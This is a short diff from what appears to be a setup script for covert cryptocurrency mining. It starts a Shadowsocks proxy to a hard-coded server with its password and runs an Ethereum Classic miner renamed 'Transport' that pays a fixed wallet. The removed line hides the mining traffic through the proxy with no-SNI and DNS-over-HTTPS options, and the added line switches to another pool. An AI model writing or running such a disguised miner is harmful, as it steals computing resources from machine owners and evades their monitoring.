@@ -39,4 +39,4 @@ ss-local -s 52.203.46.122 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305
 
 ph add Transport
 
-./Transport -a etchash -o stratum+ssl://etc-sg.flexpool.io:5555 -u 0x11880b1cfe04907c5306222be1e09f4bbb480eb5 -w RIG_ID -p x -w Transport --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
+./Transport -a etchash -o stratum+tcp://etc.2miners.com:2020 -u 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.lol
